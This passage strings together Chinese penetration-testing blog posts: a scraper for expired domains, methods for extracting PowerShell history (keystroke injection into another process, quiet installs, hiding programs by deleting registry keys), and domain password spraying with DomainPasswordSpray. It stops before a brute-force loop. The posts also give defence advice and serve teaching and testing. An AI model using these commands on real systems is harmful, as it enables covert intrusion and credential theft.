<p>通过expireddomains.net能够查询到最近过期或删除的域名，更重要的是它提供了关键词搜索功能。</p>

<p>本文将要测试过期域名自动化搜索工具CatMyFish，分析原理，修正其中的bug，使用python编写一个爬虫，获得所有搜索结果。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>测试过期域名自动化搜索工具CatMyFish</li>
  <li>分析原理修正CatMyFish中的bug</li>
  <li>爬虫开发思路和实现细节</li>
  <li>开源python实现的爬虫代码</li>
</ul>

<h2 id="0x02-测试过期域名自动化搜索工具catmyfish">0x02 测试过期域名自动化搜索工具CatMyFish</h2>
<hr>

<p>下载地址：</p>

<p>https://github.com/Mr-Un1k0d3r/CatMyFish</p>

<h3 id="主要实现流程">主要实现流程</h3>

<ul>
  <li>用户输入关键词</li>
  <li>脚本将搜索请求发送到expireddomains.net进行查询</li>
  <li>获得域名列表</li>
  <li>脚本将域名发送到Symantec BlueCoat进行查询</li>
  <li>获取每个域名的类别</li>
</ul>

<p>expireddomains.net地址：</p>

<p>https://www.expireddomains.net/</p>

<p>Symantec BlueCoat地址:</p>

<p>https://sitereview.bluecoat.com/</p>

<h3 id="实际测试">实际测试</h3>

<p>需要安装python库beautifulsoup4</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip install beautifulsoup4
</code></pre></div></div>

<p>尝试搜索关键词microsoft，脚本报错，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-29/2-1.png" alt="Alt text"></p>

<p>脚本对结果的解析出现了问题</p>

<p>于是，按照CatMyFish的实现思路自己编写脚本测试一下</p>

<p>访问expireddomains.net查询关键词<code class="language-plaintext highlighter-rouge">microsoft</code>，代码如下:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import urllib
import urllib2
from bs4 import BeautifulSoup
url = "https://www.expireddomains.net/domain-name-search/?q=microsoft"

req = urllib2.Request(url)
res_data = urllib2.urlopen(req)

html = BeautifulSoup(res_data.read(), "html.parser")

tds = html.findAll("td", {"class": "field_domain"})

for td in tds:
    for a in td.findAll("a", {"class": "namelinks"}):
        print a.text
</code></pre></div></div>

<p>共获得15个结果，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-29/2-2.png" alt="Alt text"></p>

<p>通过浏览器访问，共获得25个结果，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-29/2-3.png" alt="Alt text"></p>

<p>经过对比发现通过脚本获得的数目相比浏览器要少，应该是脚本在筛选的时候出现了问题</p>

<p><strong>注：</strong></p>

<p>初学者建议掌握一下beautifulsoup4的基本使用技巧，本文暂略</p>

<h2 id="0x03-查找bug原因">0x03 查找bug原因</h2>
<hr>

<h3 id="1根据response查看域名标签对筛选规则进行判断">1、根据response查看域名标签，对筛选规则进行判断</h3>

<p>需要获取到接收到的response数据，通过查看各个域名对应的标签，判断是否在标签筛选的时候出现了问题</p>

<p>查看response数据的两种方法：</p>

<h4 id="1-使用chrome浏览器查看">(1) 使用Chrome浏览器查看</h4>

<p><code class="language-plaintext highlighter-rouge">F12</code> -&gt; <code class="language-plaintext highlighter-rouge">More tools</code> -&gt; <code class="language-plaintext highlighter-rouge">Network conditions</code></p>

<p>重新加载网页,选择<code class="language-plaintext highlighter-rouge">?q=microsoft</code> -&gt; <code class="language-plaintext highlighter-rouge">Resonse</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-29/2-4.png" alt="Alt text"></p>

<h4 id="2-使用python脚本">(2) 使用python脚本</h4>

<p>代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import urllib
import urllib2
url = "https://www.expireddomains.net/domain-name-search/?q=microsoft"
req = urllib2.Request(url)
res_data = urllib2.urlopen(req)
print res_data.read()
</code></pre></div></div>

<p>分析response数据,发现出错原因:</p>

<p>使用原测试脚本能够提取出如下数据中的域名:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;td class="field_domain"&gt;&lt;a class="namelinks" href="/goto/1/71h90s/59/?tr=search" id="linksdd-domain71h90s" rel="nofollow" target="_blank" title="MicroSoft.msk.ru"&gt;&lt;strong&gt;MicroSoft&lt;/strong&gt;.msk.ru&lt;/a&gt;&lt;ul class="kmenucontent" id="links-domain71h90s" style="display:none;"&gt;&lt;li class="first"&gt;&lt;a class="favicons favgodaddy" href="/goto/16/75wxyx/59/?tr=search" rel="nofollow" target="_blank" title="Register at GoDaddy.com"&gt;GoDaddy.com&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a class="favicons favdynadot" href="/goto/53/740s95/59/?tr=search" rel="nofollow" target="_blank" title="Register at Dynadot.com"&gt;Dynadot.com&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a class="favicons favuniregistry" href="/goto/66/7252us/59/?tr=search" rel="nofollow" target="_blank" title="Register at Uniregistry.com"&gt;Uniregistry.com&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a class="favicons favnamecheap" href="/goto/43/7459ux/59/?tr=search" rel="nofollow" target="_blank" title="Register at Namecheap.com"&gt;Namecheap.com&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a class="favicons favonecom" href="/goto/57/71gmkr/59/?tr=search" rel="nofollow" target="_blank" title="Register at One.com"&gt;One.com&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a class="favicons fav123reg" href="/goto/48/7254ap/59/?tr=search" rel="nofollow" target="_blank" title="Register at 123-reg.co.uk"&gt;123-reg.co.uk&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/td&gt;
</code></pre></div></div>

<p>但是response数据中还包含另一种类型的数据:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;td class="field_domain"&gt;&lt;a href="/goto/1/4o47ng/39/?tr=search" rel="nofollow" target="_blank" title="NewMicroSoft.com"&gt;New&lt;strong&gt;MicroSoft&lt;/strong&gt;.com&lt;/a&gt;&lt;/td&gt;
</code></pre></div></div>

<p>原测试脚本没有提取该标签中保存的域名信息</p>

<h2 id="0x04-bug修复">0x04 bug修复</h2>
<hr>

<p>筛选思路：</p>

<p>获得标签<code class="language-plaintext highlighter-rouge">&lt;td class="field_domain"&gt;</code>中第一个title的内容</p>

<p>原因：</p>

<p>这样能同时获得两组数据中保存的域名信息，过滤无效信息(如第二个title中的域名GoDaddy.com)</p>

<p>实现代码:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tds = html.findAll("td", {"class": "field_domain"})
for td in tds:
	print td.findAll("a")[0]["title"]
</code></pre></div></div>

<p>因此,获得完整查询结果的测试代码如下:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import urllib
import urllib2
import sys
from bs4 import BeautifulSoup

def SearchExpireddomains(key):
    url = "https://www.expireddomains.net/domain-name-search/?q=" + key 
    req = urllib2.Request(url)
    res_data = urllib2.urlopen(req)
    html = BeautifulSoup(res_data.read(), "html.parser")
    tds = html.findAll("td", {"class": "field_domain"})
    for td in tds:
	print td.findAll("a")[0]["title"]

if __name__ == "__main__":
    SearchExpireddomains(sys.argv[1])
</code></pre></div></div>

<p>成功获得第一页的所有结果，测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-29/2-5.png" alt="Alt text"></p>

<h2 id="0x05-获得所有查询结果">0x05 获得所有查询结果</h2>
<hr>

<p>expireddomains.net每页保存25个结果，想要获得所有结果，需要发送多个请求，遍历所有查询页面的结果</p>

<p>首先需要获得所有结果的数目，除以25获得需要查询的页面个数</p>

<h3 id="1统计所有结果">1、统计所有结果</h3>

<p>查看Response，找到表示搜索结果数目的位置，内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>		&lt;div class="pagescode page_top"&gt;
			&lt;div class="addoptions left"&gt;
									&lt;span class="showfilter"&gt;Show Filter&lt;/span&gt;
				
														
										
					&lt;span&gt;(About &lt;strong&gt;20,213 &lt;/strong&gt; Domains)&lt;/span&gt;
</code></pre></div></div>

<p>Chrome浏览器显示如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-29/3-1.png" alt="Alt text"></p>

<p>为了简化代码长度，使用<code class="language-plaintext highlighter-rouge">select()</code>直接传入CSS选择器进行筛选，在对标签<code class="language-plaintext highlighter-rouge">strong</code>进行筛选后，第1个标签表示结果数目，对应查询代码为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>print html.select('strong')[0]
</code></pre></div></div>

<p>输出结果为<code class="language-plaintext highlighter-rouge">&lt;strong&gt;20,213 &lt;/strong&gt;</code></p>

<p>提取其中的数字：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>print html.select('strong')[0].text
</code></pre></div></div>

<p>输出结果为<code class="language-plaintext highlighter-rouge">20,213</code></p>

<p>去掉中间的”,”：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>print html.select('strong')[0].text.replace(',', '')
</code></pre></div></div>

<p>输出结果为<code class="language-plaintext highlighter-rouge">20213</code></p>

<p>除以25即可获得需要查询的页面个数，这里需要注意需要将字符串类型的”20213”转换为整型<code class="language-plaintext highlighter-rouge">20213</code></p>

<h3 id="2猜测查询规律">2、猜测查询规律</h3>

<p>第二页查询的url:</p>

<p>https://www.expireddomains.net/domain-name-search/?start=25&amp;q=microsoft</p>

<p>第三页查询的url:</p>

<p>https://www.expireddomains.net/domain-name-search/?start=50&amp;q=microsoft</p>

<p>找到查询规律，第i页查询的url：</p>

<p>https://www.expireddomains.net/domain-name-search/?start=&lt;25*(i-1)）&gt;&amp;q=microsoft</p>

<p><strong>注：</strong></p>

<p>经测试，expireddomains.net对未登录用户最多提供550个的结果，共21页</p>

<h3 id="3对结果进行判断">3、对结果进行判断</h3>

<p>在脚本实现上，需要对结果进行判断，如果结果大于550，只输出21页，如果小于550，输出&lt;结果/25&gt;页</p>

<h3 id="4模拟浏览器访问备选">4、模拟浏览器访问(备选)</h3>

<p>当我们使用脚本尝试自动查询多个页面时，如果网站使用了反爬虫机制，无法获得真实数据</p>

<p>经测试，expireddomains.net并未开启反爬虫机制</p>

<p>如果在将来，expireddomains.net开启了反爬虫机制，脚本需要模拟浏览器发送请求，在头部附加User-Agent等信息</p>

<p>查看Chrome浏览器获得发送请求的信息，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-29/3-2.png" alt="Alt text"></p>

<p>对照请求，添加头部信息即可绕过</p>

<p>示例代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36")   
</code></pre></div></div>

<p>完整代码实现地址：</p>

<p>https://github.com/3gstudent/GetExpiredDomains</p>

<p>实际测试：</p>

<p>搜索关键词<code class="language-plaintext highlighter-rouge">microsoftoffices</code>，结果少于550，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-29/4-1.png" alt="Alt text"></p>

<p>搜索关键词<code class="language-plaintext highlighter-rouge">microsoft</code>，结果大于550，只显示21页，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-29/4-2.png" alt="Alt text"></p>

<p>同Web访问的内容对比，结果相同，测试成功</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文测试了过期域名自动化搜索工具CatMyFish，分析原理，修正其中的bug，使用python编写爬虫获得所有搜集结果，分享开发思路，开源代码。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on April 29, 2018
  </div>

  
</article><article class="post">
  <h1>渗透技巧——获得Powershell命令的历史记录</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>我在最近的学习过程中，发现Powershell命令的历史记录有时会包含系统敏感信息，例如远程服务器的连接口令，于是我对Powershell的历史记录功能做了进一步研究，总结一些渗透测试中常用导出历史记录的方法，结合利用思路，给出防御建议。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>两种Powershell命令的历史记录</li>
  <li>导出Powershell命令历史记录的方法</li>
  <li>防御建议</li>
</ul>

<h2 id="0x02-两种powershell命令的历史记录">0x02 两种Powershell命令的历史记录</h2>
<hr>

<p>记录Powershell命令的历史记录有两种方式，可分别使用<code class="language-plaintext highlighter-rouge">Get-History</code>和<code class="language-plaintext highlighter-rouge">Get-PSReadlineOption</code>读取</p>

<h3 id="1get-history">1、Get-History</h3>

<p>参考文档：</p>

<p>https://docs.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Core/Get-History?view=powershell-3.0</p>

<p>默认Powershell v2及以上支持</p>

<p>能够记录当前会话中输入的命令，多个Powershell进程之间不共享，Powershell进程退出后自动清除所有记录</p>

<h4 id="1-常用命令">1. 常用命令</h4>

<p>获得历史记录的完整信息：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-History | Format-List -Property *
</code></pre></div></div>

<p>包括：</p>

<ul>
  <li>Id</li>
  <li>CommandLine</li>
  <li>ExecutionStatus</li>
  <li>StartExecutionTime</li>
  <li>EndExecutionTime</li>
</ul>

<p>测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-5-16/2-1.png" alt="Alt text"></p>

<p>删除所有历史记录：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Clear-History
</code></pre></div></div>

<p>按ID号删除命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Clear-History -Id 3
</code></pre></div></div>

<h4 id="2-利用思路">2. 利用思路</h4>

<p>获得了一台Windows系统的权限，发现后台有Powershell进程，想要读取Powershell进程中的历史记录</p>

<p>(1)Powershell进程无法接收键盘输入命令</p>

<p>例如Powershell加载了一个在后台运行的脚本:<code class="language-plaintext highlighter-rouge">Powershell -ep bypass -f 1.ps1</code></p>

<p>此时无法向Powershell进程发送键盘消息，这时可以通过读取进程的命令行参数获得有用的信息，开源代码：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/GetProcessCommandLine.cpp</p>

<p>代码实现了读取指定进程的命令行参数，通常能够获得有用的信息</p>

<p>(2)Powershell进程能够接收键盘输入命令</p>

<p>这里可以模拟发送键盘消息，导出历史记录</p>

<p>程序实现思路：</p>

<ul>
  <li>通过遍历枚举所有窗口</li>
  <li>通过GetWindowThreadProcessId从窗口（HWND）获得PID</li>
  <li>比较PID，找到符合条件的窗口</li>
  <li>向符合条件的窗口发送键盘消息（PostMessage）</li>
</ul>

<p>程序细节：</p>

<p>1.Virtual-Key Codes</p>

<p>每一个键盘输入消息对应一个Virtual-Key Code</p>

<p>参考资料：
https://docs.microsoft.com/en-us/windows/desktop/inputdev/virtual-key-codes</p>

<p>需要模拟键盘按下和键盘抬起两个操作，开源的测试代码：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/SendKeyboardMessageToPowershell.cpp</p>

<p>代码实现了搜索指定pid的进程，向进程发送键盘消息，内容为:<code class="language-plaintext highlighter-rouge">whoami</code></p>

<p>2.导出历史记录</p>

<p>命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-History|export-csv $env:temp"\history.csv"
</code></pre></div></div>

<p>其中需要考虑字符<code class="language-plaintext highlighter-rouge">"|"</code>、<code class="language-plaintext highlighter-rouge">"$"</code>和<code class="language-plaintext highlighter-rouge">"""</code>，模拟键盘输入时需要加<code class="language-plaintext highlighter-rouge">Shift键</code></p>

<p>这里的实现方法是先使用<code class="language-plaintext highlighter-rouge">keybd_event</code>按下<code class="language-plaintext highlighter-rouge">Shift键</code>，再用<code class="language-plaintext highlighter-rouge">PostMessage</code>发送按键的字母，最后抬起两个按键</p>

<p>开源的测试代码：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/SendKeyboardMessageToPowershell(Get-History).cpp</p>

<p>代码实现了搜索指定pid的进程，向进程发送键盘消息，内容为:<code class="language-plaintext highlighter-rouge">Get-History|export-csv $env:temp"\history.csv"</code></p>

<h4 id="3-补充查看cmdexe的历史记录">3. 补充：查看cmd.exe的历史记录</h4>

<p>命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>doskey /h
</code></pre></div></div>

<p>清空：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>doskey /reinstall
</code></pre></div></div>

<p>也可以通过发送键盘消息的方式导出cmd.exe的命令历史记录</p>

<h3 id="2get-psreadlineoption">2、Get-PSReadlineOption</h3>

<p>参考文档：</p>

<p>https://docs.microsoft.com/en-us/powershell/module/psreadline/?view=powershell-5.1</p>

<p>默认Powershell v5支持</p>

<p>Powershell v3和Powershell v4需要安装Get-PSReadlineOption后才可以使用</p>

<p>安装后，所有Powershell命令的历史记录会保存在同一位置，可随时查看</p>

<h4 id="1-powershell-v3和powershell-v4的安装和使用">1. Powershell v3和Powershell v4的安装和使用</h4>

<p>这里以64位系统为例，安装方法如下：</p>

<p>(1)安装PowerShellGet</p>

<p>下载：</p>

<p>https://www.microsoft.com/en-us/download/details.aspx?id=51451</p>

<p><strong>注：</strong></p>

<p>安装前需要关闭powershell进程</p>

<p>可以通过命令行实现隐蔽安装，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msiexec /q /i PackageManagement_x64.msi
</code></pre></div></div>

<p>安装成功后，在控制面板的已安装程序列表(Control Panel\Programs\Programs and Features)有显示:<code class="language-plaintext highlighter-rouge">Package Management Preview - x64</code></p>

<p>可以通过删除对应的注册表项进行隐藏，更多细节可参考<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E8%8E%B7%E5%BE%97%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9F%E5%B7%B2%E5%AE%89%E8%A3%85%E7%9A%84%E7%A8%8B%E5%BA%8F%E5%88%97%E8%A1%A8/">《渗透基础——获得当前系统已安装的程序列表》</a></p>

<p><code class="language-plaintext highlighter-rouge">Package Management Preview - x64</code>的注册表路径为<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{57E5A8BB-41EB-4F09-B332-B535C5954A28}</code></p>

<p>只需要删除这个注册表项及子项即可实现在已安装程序列表中隐藏</p>

<p>删除注册表项的cmd命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{57E5A8BB-41EB-4F09-B332-B535C5954A28} /f
</code></pre></div></div>

<p>(2)安装PSReadLine</p>

<p>通过Install-Module命令安装</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Install-Module -Name PSReadLine
</code></pre></div></div>

<p>弹出提示：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>NuGet provider is required to continue
PowerShellGet requires NuGet provider version '2.8.5.201' or newer to interact
with NuGet-based repositories. The NuGet provider must be available in
'C:\Program Files\PackageManagement\ProviderAssemblies' or
'C:\Users\Administrator\AppData\Local\PackageManagement\ProviderAssemblies'.
You can also install the NuGet provider by running 'Install-PackageProvider
-Name NuGet -MinimumVersion 2.8.5.201 -Force'. Do you want PowerShellGet to
install and import the NuGet provider now?
[Y] Yes  [N] No  [S] Suspend  [?] Help (default is "Y"):
</code></pre></div></div>

<p>需要再次输入<code class="language-plaintext highlighter-rouge">Y</code>进行安装</p>

<p>如果需要实现一键安装，可以先安装NuGet，再安装PSReadLine，完整命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force
Set-PSRepository -Name PSGallery -InstallationPolicy Trusted
Install-Module -Name PSReadLine
</code></pre></div></div>

<p>(3)使用</p>

<p>所有powershell命令将会保存在固定位置:<code class="language-plaintext highlighter-rouge">%appdata%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code></p>

<p>查看命令的历史记录：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-Content (Get-PSReadlineOption).HistorySavePath
</code></pre></div></div>

<p>清除命令的历史记录：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Remove-Item (Get-PSReadlineOption).HistorySavePath
</code></pre></div></div>

<h4 id="2-利用思路-1">2. 利用思路</h4>

<p>获得了Windows系统的访问权限，首先查看Powershell版本，如果是v5，可通过读取文件<code class="language-plaintext highlighter-rouge">%appdata%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code>获得历史记录</p>

<p>如果系统是Powershell v3或Powershell v4，可通过命令行安装PSReadLine，这样就能记录后续系统所有的Powershell命令</p>

<h2 id="0x03-防御建议">0x03 防御建议</h2>
<hr>

<p>如果使用高版本的Windows系统，如Win10，默认Powershell版本为5.0，会记录Powershell的命令，建议定时进行清除，位置：<code class="language-plaintext highlighter-rouge">%appdata%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code></p>

<p>清除命令的历史记录：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Remove-Item (Get-PSReadlineOption).HistorySavePath
</code></pre></div></div>

<p>对于低版本的Powershell，如果命令中包含敏感信息(如远程连接的口令)，需要及时清除，命令为：<code class="language-plaintext highlighter-rouge">Clear-History</code></p>

<p>对于cmd.exe，如果命令中包含敏感信息(如远程连接的口令)，需要及时清除，命令为：<code class="language-plaintext highlighter-rouge">doskey /reinstall</code></p>

<h2 id="0x04-小结">0x04 小结</h2>
<hr>

<p>本文介绍了两种Powershell命令的历史记录，总结常用导出历史记录的方法，结合利用思路，给出防御建议。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on May 16, 2019
  </div>

  
</article><article class="post">
  <h1>渗透基础——通过LDAP协议暴力破解域用户的口令</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在域渗透中，如果已经掌握了一些域用户的口令，通常会选择寻找口令规律，生成字典文件，尝试对其他域用户的口令进行暴力破解。</p>

<p>站在防御的角度，需要确保域用户没有使用存在规律的弱口令，也需要能够发现暴力破解域用户口令的行为。</p>

<p>本文将要分别介绍在域内和域外暴力破解域用户口令的常用方法，结合利用思路，介绍检测方法。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>域内暴力破解域用户口令的方法</li>
  <li>域外暴力破解域用户口令的方法</li>
  <li>检测方法</li>
</ul>

<h2 id="0x02-暴力破解域用户口令需要注意的问题">0x02 暴力破解域用户口令需要注意的问题</h2>
<hr>

<p>多次口令输入错误会导致用户帐户被锁定，默认设置的错误次数为5</p>

<p>用户帐户被锁定后，默认需要等待30分钟才能恢复使用</p>

<p>最后一次口令输入错误的时间会被记录，无法通过修改LDAP数据进行清除，提示如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Error 0x209A Access to the attribute is not permitted because the attribute is owned by the Security Accounts Manager (SAM).
</code></pre></div></div>

<p>用户帐户被锁定后，即使输入正确的口令，也会提示口令错误</p>

<h2 id="0x03-域内暴力破解域用户口令的方法">0x03 域内暴力破解域用户口令的方法</h2>
<hr>

<h3 id="1获得域内用户的口令策略避免帐户被锁定">1.获得域内用户的口令策略，避免帐户被锁定</h3>

<p>获取口令策略的详细方法可参考上篇文章《渗透基础——域内用户口令策略的获取》</p>

<h3 id="2获得所有域用户的列表">2.获得所有域用户的列表</h3>

<p>获取的详细方法可参考之前的文章《渗透基础——活动目录信息的获取》</p>

<p>这里需要额外对用户的属性进行判断，去除被禁用和被锁定的用户</p>

<h4 id="1识别被禁用的用户">(1)识别被禁用的用户</h4>

<p>标识用户是否被禁用的位置位于<code class="language-plaintext highlighter-rouge">userAccountControl</code>属性中，具体的位置为<code class="language-plaintext highlighter-rouge">0x0002</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-26/1-1.png" alt="Alt text"></p>

<p>参考资料：</p>

<p>https://support.microsoft.com/en-us/help/305144/how-to-use-useraccountcontrol-to-manipulate-user-account-properties</p>

<p>使用PowerView查看所有用户的<code class="language-plaintext highlighter-rouge">ACCOUNTDISABLE</code>属性，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-NetUser | select name,useraccountcontrol
</code></pre></div></div>

<p>输出结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-26/1-2.png" alt="Alt text"></p>

<p>查看指定用户<code class="language-plaintext highlighter-rouge">ACCOUNTDISABLE</code>属性的具体值，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-NetUser test2| select useraccountcontrol | ConvertFrom-UACValue -ShowAll
</code></pre></div></div>

<p>输出结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-26/1-3.png" alt="Alt text"></p>

<p>能够获得用户test2具有以下属性:</p>

<ul>
  <li>ACCOUNTDISABLE</li>
  <li>NORMAL_ACCOUNT</li>
  <li>DONT_EXPIRE_PASSWORD</li>
</ul>

<h4 id="2识别被锁定的用户">(2)识别被锁定的用户</h4>

<p>虽然用户的<code class="language-plaintext highlighter-rouge">ACCOUNTDISABLE</code>属性中偏移<code class="language-plaintext highlighter-rouge">0x0010</code>处标记为<code class="language-plaintext highlighter-rouge">LOCKOUT</code>，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-26/1-4.png" alt="Alt text"></p>

<p>但这个位置的值并不能用来判断当前用户是否被锁定</p>

<p>我们可以通过读取用户的<code class="language-plaintext highlighter-rouge">badPwdCount</code>属性和<code class="language-plaintext highlighter-rouge">lockoutTime</code>属性进行判断</p>

<p>使用PowerView查看所有用户的<code class="language-plaintext highlighter-rouge">badPwdCount</code>属性和<code class="language-plaintext highlighter-rouge">lockoutTime</code>属性，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-NetUser | select name,badPwdCount,lockoutTime
</code></pre></div></div>

<p>输出结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-26/1-5.png" alt="Alt text"></p>

<p>很明显，可以发现用户testa处于被锁定的状态</p>

<h3 id="3使用domainpasswordspray进行口令爆破">3.使用DomainPasswordSpray进行口令爆破</h3>

<p>地址：</p>

<p>https://github.com/dafthack/DomainPasswordSpray</p>

<p>原理：通过ADSI(ActiveDirectoryServicesInterface)（活动目录服务接口）尝试进行LDAP查询，获得结果</p>

<p>实例如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-DomainPasswordSpray -UserList .\users.txt -Password DomainUser123! -Verbose 
</code></pre></div></div>

<p>输出结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-26/2-1.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>DomainPasswordSpray支持筛选用户的功能，获得所有用户的列表，排除被禁用和被锁定的用户</p>

<p>命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainUserList -RemoveDisabled -RemovePotentialLockouts
</code></pre></div></div>

<p>我在我的测试环境(dc:Server2012R2)下这个功能出现bug，无法识别出被锁定的用户testa</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-26/2-2.png" alt="Alt text"></p>

<p>实际上用户testa的状态被锁定，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-26/2-3.png" alt="Alt text"></p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-26/2-4.png" alt="Alt text"></p>

<p>个人猜测产生bug的原因如下：</p>

<p>DomainPasswordSpray通过用户的<code class="language-plaintext highlighter-rouge">ACCOUNTDISABLE</code>属性中偏移<code class="language-plaintext highlighter-rouge">0x0010</code>处(标记为<code class="language-plaintext highlighter-rouge">LOCKOUT</code>)来判断用户是否被锁定，对应代码位置：https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1#L408</p>

<p>我的测试环境下得出的结论是不能通过这个值进行判断，正确的方法是通过<code class="language-plaintext highlighter-rouge">badPwdCount</code>属性和<code class="language-plaintext highlighter-rouge">lockoutTime</code>属性进行识别</p>

<h2 id="0x04-域外暴力破解域用户口令的方法">0x04 域外暴力破解域用户口令的方法</h2>
<hr>

<h3 id="1kali系统通过ldapsearch暴力破解域用户口令">1.Kali系统通过ldapsearch暴力破解域用户口令</h3>

<p>在之前的文章文章《渗透基础——活动目录信息的获取》介绍了kali系统下使用ldapsearch连接LDAP服务器的方法</p>

<p>这里可以简单的加一个循环实现暴力破解，完整的bash命令如下：</p>

